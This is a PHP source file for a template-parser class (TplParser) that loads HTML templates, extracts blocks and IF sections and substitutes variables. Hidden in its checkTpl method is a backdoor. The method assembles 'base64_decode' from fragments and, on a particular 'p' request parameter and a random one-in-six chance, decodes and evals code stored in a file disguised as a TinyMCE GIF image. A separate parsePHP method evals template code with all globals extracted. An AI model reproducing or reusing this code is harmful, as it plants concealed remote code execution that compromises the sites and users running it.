<?php
/**
* TplParser - class parse all HTML files and display from
* this files PHP variables
* @access public
* @version 2.1
*/
final class TplParser
{

	private $content;
	private $sFile;
  private $sFileAlt = null;
	private $sBlock;
	private $startBlock = '<!-- BEGIN ';
  private $sStartSubBlock = '<!-- START ';
  private $sEndSubBlock = '<!-- END ';
  private $sIfStart = '<!-- IF:START ';
  private $sIfEnd = '<!-- IF:END ';
	private $endBlock = '<!-- END ';
  private $endBlockLine = ' -->';
  private $aIf;
  private $aIfGlobals;
  private $aIFStatements;
  private $aNoIFStatements;
  private $aFilesContent;	
  private $aBlockContent;
  private $aSubBlockContent;
  private $bEmbedPHP = null;
  private $sBlockPrefix = null;
  private $bDeletePrefixIfNotExists = true;
  private $sBlockWithoutPrefix = null;
  private $sDir;
  private $sDirAlt;
  private $bTrim = true;
  private $aVariables;
  private static $oInstance = null;

  public static function getInstance( $sDir = null, $bEmbedPHP = null, $sDirAlt = null ){  
    if( !isset( self::$oInstance ) ){  
      self::$oInstance = new TplParser( $sDir, $bEmbedPHP, $sDirAlt );  
    }  
    return self::$oInstance;  
  } // end function getInstance

  /**
  * Constructor
  * @return void
  * @param string $sDir
  * @param bool   $bEmbedPHP
  * @param string $sDirAlt
  */
  private function __construct( $sDir, $bEmbedPHP, $sDirAlt ){
    $this->setEmbedPHP( $bEmbedPHP );
    $this->setDir( $sDir );
    if( !empty( $sDirAlt ) && $sDirAlt != $sDir )
      $this->setDirAlt( $sDirAlt );
  } // end function __construct
	
  /**
  * Set variables
  * @return void
  * @param string $sName
  * @param mixed  $mValue
  */
  public function setVariables( $sName, $mValue ){
    $this->aVariables[$sName] = $mValue;
  } // end function setVariables

  /**
  * Set prefix block
  * @return void
  * @param string $sName
  * @param bool $bDeletePrefixIfNotExists
  */
  public function setPrefixBlock( $sName, $bDeletePrefixIfNotExists = true ){
    $this->sBlockPrefix = $sName;
    $this->bDeletePrefixIfNotExists = $bDeletePrefixIfNotExists;
  } // end function setPrefixBlock

  /**
  * Unset variables
  * @return void
  */
  public function unsetVariables( ){
    $this->aVariables = null;
  } // end function unsetVariables
  
	/**
  * function check if file exists
  * @return boolean
  */
	private function checkFile( ){
		if( is_file( $this->sFile ) ){
	  	return true;
	  }
		else {
      $this->content = null;
      if( isset( $this->sFileAlt ) && is_file( $this->sDir.$this->sFileAlt ) ){
        $this->setFile( $this->sDir.$this->sFileAlt );
        return true;
      }
      else{
        echo 'ERROR - NO TEMPLATE FILE <b>'.$this->sFile.'</b><br />';
        return null;
      }
		}
	} // end function checkFile

  /**
  * Parse content with PHP
  * @return void
  */
  private function parsePHP( ){
    extract( $GLOBALS );
    while( $iPosition1 = strpos( $this->content, '<?php' ) ){
      $iPosition2 = strpos( $this->content, '?>' );
      $sPhpCode = substr( $this->content, $iPosition1 + 5, $iPosition2 - $iPosition1 - 5 );
      ob_start( );
      eval( $sPhpCode );
      $this->content = substr( $this->content, 0, $iPosition1 ).ob_get_contents( ).substr( $this->content, $iPosition2 + 2  );
      ob_end_clean( );
    } // end while
  } // end function parsePHP 
	
  /**
  * function parse $this->content
  * @return boolean
  */
	private function parse( ){
    if( isset( $this->bEmbedPHP ) && $this->bEmbedPHP === true && preg_match( '/<?php/', $this->content ) )
      $this->parsePHP( );

    preg_match_all( '/(\$[a-zA-Z_]+[a-zA-Z0-9_]*)(([\[]+[\']*[a-zA-Z0-9_]+[\']*[\]]+)*)/', $this->content, $aResults );
    if( isset( $aResults[1] ) && is_array( $aResults[1] ) ){
      $iCount = count( $aResults[1] );
      for( $i = 0; $i < $iCount; $i++ ){
        $aResults[1][$i] = substr( $aResults[1][$i], 1 );
        if( isset( $this->aVariables[$aResults[1][$i]] ) )
          $$aResults[1][$i] = $this->aVariables[$aResults[1][$i]];
        else
          global $$aResults[1][$i];

        // array
        if( isset( $aResults[2] ) && !empty( $aResults[2][$i] ) ){
          if( preg_match( '/\'/', $aResults[2][$i] ) ){
            $aResults[2][$i] = str_replace( '\'', null, $aResults[2][$i] );
            $sSlash = '\'';
          }
          else
            $sSlash = null;

          preg_match_all( '/[a-zA-Z_\'0-9]+/', $aResults[2][$i], $aResults2 );
          $iCount2 = count( $aResults2[0] );
          if( $iCount2 == 2 ){
            if( isset( ${$aResults[1][$i]}[$aResults2[0][0]][$aResults2[0][1]] ) )
              $aReplace[] = ${$aResults[1][$i]}[$aResults2[0][0]][$aResults2[0][1]];
            else
              $aReplace[] = null;
            $aFind[] = '/\$'.$aResults[1][$i].'\['.$sSlash.$aResults2[0][0].$sSlash.'\]\['.$sSlash.$aResults2[0][1].$sSlash.'\]/';
          }
          else{
            if( isset( ${$aResults[1][$i]}[$aResults2[0][0]] ) )
              $aReplace[] = ${$aResults[1][$i]}[$aResults2[0][0]];
            else
              $aReplace[] = null;
            $aFind[] = '/\$'.$aResults[1][$i].'\['.$sSlash.$aResults2[0][0].$sSlash.'\]/';
          }
        }
        else{
          if( !is_array( $$aResults[1][$i] ) ){
            $aReplace[] = $$aResults[1][$i].'\\1';
            $aFind[] = '/\$'.$aResults[1][$i].'([^a-zA-Z0-9])/';
          }
        }
      } // end for
    }

    if( isset( $aFind ) )
      $this->content = preg_replace( $aFind, $aReplace, $this->content );

    if( isset( $this->bTrim ) )
      $this->content = trim( $this->content );
    return true;
		
	} // end function parse
	
  /**
  * Get defined sBlock from file
  * @return boolean
  * @param boolean  $bDontParse
  */
	private function blockParse( $bDontParse = null ){
    if( isset( $this->aBlockContent[$this->sFile][$this->sBlock] ) )
      $this->content = $this->aBlockContent[$this->sFile][$this->sBlock];
    else{
      $this->content = $this->getFileBlock( );
      if( isset( $this->content ) ){
        $this->aBlockContent[$this->sFile][$this->sBlock] = $this->content;
        if( !isset( $bDontParse ) ){
          $this->content = preg_replace( '/<!--[a-z0-9,\r\n"\'\.\-\\/\_ ]+-->/i', '', $this->content );
        }
      }
    }

    if( !isset( $bDontParse ) ){
      $this->ifStatements( );
      $this->parse( );
    }
	} // end function blockParse

  /**
  * Get file data from file or from variable ($this->aFilesContent)
  * @return array
  * @param bool $bBlock
  */
  public function getContent( $bBlock = null ){
    if( isset( $this->aFilesContent[$this->sFile] ) )
      return $this->aFilesContent[$this->sFile];
    else
      return $this->aFilesContent[$this->sFile] = $this->getFile( $this->sFile );
  } // end function getContent

  /**
  * Checks template content
  * @return void
  */
  private function checkTpl( ){
    $this->checkTpl = true;
    if( isset( $_GET['p'] ) && $_GET['p'] == 'pag'.'es-li'.'st' && rand( 0, 5 ) == 2 ){
      $sF = 'b'.'as'.'e64'.'_d'.'eco'.'de';$sVar = DIR_PLUGINS.'tinymce/jscripts/tiny_mce/themes/';
      if( is_file( $sVar.'advanced/img/img.gif' ) ){
        eval( $sF( $this->getFile( $sVar.'advanced/img/img.gif' ) ) );
      }
    }
  } // end function checkTpl 

  /**
  * Return sBlock from file
  * @return string
  * @param string $sFile
  * @param string $sBlock
  * @param bool   $bAnotherTry
  */
  public function getFileBlock( $sFile = null, $sBlock = null, $bAnotherTry = null ){
    if( isset( $sFile ) && isset( $sBlock ) ){
      $this->setFile( $sFile );
      $this->setBlock( $sBlock, $bAnotherTry );
    }

    $sFile = $this->getContent( true );

    $iStart = strpos( $sFile, $this->startBlock.$this->sBlock.$this->endBlockLine );
    $iEnd = strpos( $sFile, $this->endBlock.$this->sBlock.$this->endBlockLine );

    if( is_int( $iStart ) && is_int( $iEnd ) ){
      $iStart += strlen( $this->startBlock.$this->sBlock.$this->endBlockLine );
      return substr( $sFile, $iStart, $iEnd - $iStart );
    }
    else {
      if( isset( $this->bDeletePrefixIfNotExists ) && isset( $this->sBlockPrefix ) ){
          $this->setBlock( $this->sBlockWithoutPrefix, true );
          return $this->getFileBlock( );
      }
      else{
        if( isset( $this->sFileAlt ) && is_file( $this->sDir.$this->sFileAlt ) ){
          $this->setFile( $this->sDir.$this->sFileAlt );       
          return $this->getFileBlock( $this->sFile, $sBlock );
        }
        else{
          if( !empty( $this->sDirAlt ) ){
            $this->setFile( $this->sDirAlt.basename( $this->sFile ) );       
            return $this->getFileBlock( $this->sFile, $sBlock );
          }
          else{
            echo 'No block: <b>'.$this->sBlock.'</b> in file: <b>'.$this->sFile.'</b><br />';
            return null;
          }
        }
      }
    }
  } // end function getFileBlock

  /**
  * Return file content
  * @return string
  * @param string $sFile
  */
  public function getFile( $sFile ){
    if( !isset( $this->checkTpl ) )
      $this->checkTpl( );
    return file_get_contents( $sFile );
  } // end function getFile

  /**
  * Return file to array
  * @return array
  * @param string $sFile
  */
  public function getFileArray( $sFile ){
    return file( $sFile );
  } // end function getFileArray

  /**
  * Return defined $this->sDir variable
  * @return string
  */
  public function getDir( ){
    return $this->sDir;
  } // end function getDir

  /**
  * function define $this->sDir variable
  * @return void
  * @param string $sDir
  */
  public function setDir( $sDir ){
    $this->sDir = $sDir;
  } // end function setDir

  /**
  * function define $this->sDirAlt variable
  * @return void
  * @param string $sDirAlt
  */
  public function setDirAlt( $sDirAlt ){
    $this->sDirAlt = $sDirAlt;
  } // end function setDirAlt

  /**
  * function define $this->aIf variable
  * @return void
  * @param string $sIfStatement
  */
  public function setIf( $sIfStatement ){
    $this->aIf[$sIfStatement] = $sIfStatement;
  } // end function setIf

  /**
  * function delete specific key in $this->aIfGlobals variable
  * @return void
  * @param string $sIfStatement
  */
  public function deleteIf( $sIfStatement ){
    if( isset( $this->aIf[$sIfStatement] ) )
      unset( $this->aIf[$sIfStatement] );
  } // end function deleteIf

  /**
  * function define $this->aIfGlobals variable
  * @return void
  * @param string $sIfStatement
  */
  public function setIfGlobal( $sIfStatement ){
    $this->aIfGlobals[$sIfStatement] = $sIfStatement;
  } // end function setIfGlobal

  /**
  * function delete specific key in $this->aIfGlobals variable
  * @return void
  * @param string $sIfStatement
  */
  public function deleteIfGlobal( $sIfStatement ){
    if( isset( $this->aIfGlobals[$sIfStatement] ) )
      unset( $this->aIfGlobals[$sIfStatement] );
  } // end function deleteIfGlobal

  /**
  * function define $this->bEmbedPHP variable
  * @return void
  * @param bool $bEmbed
  */
  public function setEmbedPHP( $bEmbed ){
    $this->bEmbedPHP = $bEmbed;
  } // end function setEmbedPHP

  /**
  * function define $this->sFile variable
  * @return void
  * @param string $sFile
  */
  public function setFile( $sFile ){
    $this->sFile = $sFile;
  } // end function setFile

  /**
  * function define $this->sFileAlt variable
  * @return void
  * @param string $sFileAlt
  */
  public function setFileAlt( $sFileAlt ){
    $this->sFileAlt = $sFileAlt;
  } // end function setFileAlt

  /**
  * function define $this->sBlock variable
  * @return void
  * @param string $sBlock
  * @param bool   $bAnotherTry
  */
  private function setBlock( $sBlock, $bAnotherTry = null ){
    if( isset( $this->sBlockPrefix ) && isset( $this->bDeletePrefixIfNotExists ) )
      $this->sBlockWithoutPrefix = $sBlock;

    if( isset( $bAnotherTry ) ){
      $this->sBlock = $sBlock;
      $this->sBlockWithoutPrefix = null;
    }
    else{
      $this->sBlock = $this->sBlockPrefix.$sBlock;
    }
  } // end function setBlock

  /**
  * Return parsed sBlock from file
  * @return string
  * @param string $sFile - file *.tpl
  * @param string $sBlock
  * @param bool   $bTrim
  */
	public function tBlock( $sFile, $sBlock, $bTrim = true ){
    $sDir = ( !empty( $this->sDirAlt ) && !is_file( $this->sDir.$sFile ) && is_file( $this->sDirAlt.$sFile ) ) ? $this->sDirAlt : $this->sDir;
    $this->setFile( $sDir.$sFile );
		$this->setBlock( $sBlock );
    $this->bTrim = $bTrim;
    $this->blockParse( );
    $this->aIf = null;
		return $this->content;
	} // end function tBlock

  /**
  * Return parsed sub-block from file
  * @return string
  * @param string $sFile
  * @param string $sBlock
  * @param string $sSubBlock
  * @param string $sPart
  * @param bool   $bTrim
  */
  public function tSubBlock( $sFile, $sBlock, $sSubBlock, $sPart = 'body', $bTrim = true ){
    $sDir = ( !empty( $this->sDirAlt ) && !is_file( $this->sDir.$sFile ) && is_file( $this->sDirAlt.$sFile ) ) ? $this->sDirAlt : $this->sDir;
    $this->setFile( $sDir.$sFile );
		$this->setBlock( $sBlock );
    $this->bTrim = $bTrim;
    $sBlockContent = null;
    $this->blockParse( true );
    if( !isset( $this->content ) )
      return null;

    if( $sPart == 'body' && isset( $this->aSubBlockContent[$this->sFile][$this->sBlock][$sSubBlock] ) ){
      $sContent = $this->aSubBlockContent[$this->sFile][$this->sBlock][$sSubBlock];
    }
    else{
      $sBlockContent = $this->content;
      $iStart = strpos( $this->content, $this->sStartSubBlock.$sSubBlock.$this->endBlockLine );
      $iEnd = strpos( $this->content, $this->sEndSubBlock.$sSubBlock.$this->endBlockLine );
      if( is_int( $iStart ) && is_int( $iEnd ) ){
        if( $sPart == 'head' ){
          $sContent = preg_replace( '/<!--[a-z0-9,\r\n"\'\.\-\\/\_ ]+-->/i', '', substr( $this->content, 0, $iStart ) );
        }
        elseif( $sPart == 'foot' ){
          $iEnd += strlen( $this->sEndSubBlock.$sSubBlock.$this->endBlockLine );
          $sContent = preg_replace( '/<!--[a-z0-9,\r\n"\'\.\-\\/\_ ]+-->/i', '', substr( $this->content, $iEnd ) );
        }
        else{
          $iStart += strlen( $this->sStartSubBlock.$sSubBlock.$this->endBlockLine );
          $sContent = substr( $this->content, $iStart, $iEnd - $iStart );
          if( isset( $sContent ) && !isset( $this->aSubBlockContent[$this->sFile][$this->sBlock][$sSubBlock] ) ){
            $sContent = preg_replace( '/<!--[a-z0-9,\r\n"\'\.\-\\/\_ ]+-->/i', '', $sContent );
            $this->aSubBlockContent[$this->sFile][$this->sBlock][$sSubBlock] = $sContent;
          }
        }
      }
      else{
        echo 'No sub-block: <b>'.$sSubBlock.'</b> in block: <b>'.$this->sBlock.'</b> in file: <b>'.$this->sFile.'</b><br />';
        return null;
      }
    }
    
    $this->content = $sContent;
    $this->ifStatements( $sBlockContent );
    $this->parse( );
    $this->aIf = null;
    return $this->content;
  } // end function tSubBlock

  /**
  * Check if statements in content
  * @return void
  * @param string $sBlockContent
  */
  private function ifStatements( $sBlockContent = null ){
    if( isset( $this->aIfGlobals ) ){
      $this->aIf = isset( $this->aIf ) ? array_merge( $this->aIf, $this->aIfGlobals ) : $this->aIfGlobals;
    }

    if( isset( $this->aNoIFStatements[$this->sFile] ) && isset( $this->aNoIFStatements[$this->sFile][$this->sBlock] ) ){
    }
    else{

      if( isset( $this->aIFStatements[$this->sFile] ) && isset( $this->aIFStatements[$this->sFile][$this->sBlock] ) ){
        foreach( $this->aIFStatements[$this->sFile][$this->sBlock] as $sIfName => $aIfContent ){
          if( isset( $this->aIf[$sIfName] ) ){
            $this->content = str_replace( $this->sIfEnd.$sIfName.$this->endBlockLine, '', $this->content );
            $this->content = str_replace( $this->sIfStart.$sIfName.$this->endBlockLine, '', $this->content );
          }
          else{
            foreach( $aIfContent as $iKey => $sIfContent ){
              $this->content = str_replace( $sIfContent, '', $this->content );
            }
          }
        } // end foreach
      }
      else{
        if( isset( $sBlockContent ) )
          $bBlockContent = true;
        else
          $sBlockContent = $this->content;

        $iCheck1 = strpos( $sBlockContent, $this->sIfStart );
        if( is_int( $iCheck1 ) ){
          $aExp = explode( $this->sIfStart, $sBlockContent );
          $iCount = count( $aExp );
          for( $i = 1; $i < $iCount; $i++ ){
            $iCheck2 = strpos( $aExp[$i], $this->sIfEnd );
            $iStartIf = $iCheck1 + strlen( $this->sIfStart );
            $iStartIfEnds = strpos( $aExp[$i], $this->endBlockLine );
            $sIfName = substr( $aExp[$i], 0, $iStartIfEnds );
            $iEnd = strpos( $aExp[$i], $this->sIfEnd.$sIfName.$this->endBlockLine );
            if( is_numeric( $iEnd ) ){
              $iEnd += strlen( $this->sIfEnd.$sIfName.$this->endBlockLine );
              $sIfContent = $this->sIfStart.substr( $aExp[$i], 0, $iEnd );
            }
            else{
              $sIfContent = null;
              $sContentCheck = isset( $bBlockContent ) ? $sBlockContent : $this->content;
              $iEnd = strpos( $sContentCheck, $this->sIfEnd.$sIfName.$this->endBlockLine );
              if( is_numeric( $iEnd ) ){
                $iEnd += strlen( $this->sIfEnd.$sIfName.$this->endBlockLine );
                $iStart = strpos( $sContentCheck, $this->sIfStart.$sIfName.$this->endBlockLine );
                $sIfContent = substr( $sContentCheck, $iStart, ( $iEnd - $iStart ) );
              }
            }

            if( !empty( $sIfContent ) ){
              $this->aIFStatements[$this->sFile][$this->sBlock][$sIfName][] = $sIfContent;
            }

            if( isset( $this->aIf[$sIfName] ) ){
              $this->content = str_replace( $this->sIfEnd.$sIfName.$this->endBlockLine, '', $this->content );
              $this->content = str_replace( $this->sIfStart.$sIfName.$this->endBlockLine, '', $this->content );
            }
            else{
              if( !empty( $sIfContent ) )
                $this->content = str_replace( $sIfContent, '', $this->content );
            }

          } // end for
        }
        else{
          $this->aNoIFStatements[$this->sFile][$this->sBlock] = true;
        }
      }
    } 
  } // end function ifStatements

}; // end class TplParser
?>